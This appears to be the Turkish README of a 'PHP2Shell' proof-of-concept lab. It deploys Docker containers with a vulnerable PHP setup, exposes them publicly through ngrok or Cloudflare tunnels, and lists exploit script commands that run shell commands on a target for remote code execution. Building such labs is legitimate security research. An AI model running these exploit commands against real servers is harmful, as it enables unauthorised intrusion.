# PHP2Shell Lab

Dışarıdan erişilebilir test ortamı. İki profil: **lab** (8M) ve **production** (128M).

## Kurulum

```bash
cd lab
chmod +x setup.sh
./setup.sh
```

Script şunları yapar:
- Docker container'ları başlatır (lab + production)
- Yerel ve public IP adreslerini gösterir
- Exploit komutlarını yazdırır

## İki Profil

| Profil | Port | PHP ini | Exploit | Açıklama |
|--------|------|---------|---------|----------|
| **lab** | 8088 | `display_errors=On`, `memory_limit=8M` | `remote_cve.py` | 8M chain test |
| **production** | 8089 | `display_errors=Off`, `memory_limit=128M` | `pure_off.py` | Gerçek production test |

Production profili 150 worker ile gelir (`MaxRequestWorkers=150`) — worker pinning testi için.

## Manuel Başlatma

```bash
# Sadece lab
docker compose up -d lab

# Sadece production
docker compose -f docker-compose.yml --profile production up -d

# İkisi birden
docker compose --profile production up -d
```

## Dışarıdan Erişim

### Public IP ile

```bash
./setup.sh
# Çıktıdaki Remote URL'i arkadaşına gönder:
# http://YOUR_PUBLIC_IP:8089/
```

### ngrok ile (public IP yoksa)

```bash
brew install ngrok
ngrok http 8089
# ngrok URL'ini arkadaşına gönder
```

### Cloudflare Tunnel ile

```bash
cloudflared tunnel --url http://localhost:8089
```

## Arkadaşına Gönderilecek Komutlar

```bash
# Repo'yu klonla
git clone https://github.com/eagleofanadolu/php2shell-poc.git
cd php2shell-poc

# Lab (8M) — remote_cve.py
python3 exploit/remote_cve.py -u http://TARGET_IP:8088/index.php \
    --libphp /path/libphp.so --cmd 'id>/out/p1'

# Production (128M) — pure_off.py
python3 exploit/pure_off.py --host TARGET_IP --port 8089 --auto

# Worker pinning + production
python3 exploit/pure_off.py --host TARGET_IP --port 8089 \
    --cmd 'id>/out/p1' --proof ./out/p1 --auto
```

## Durdurma

```bash
docker compose down
```
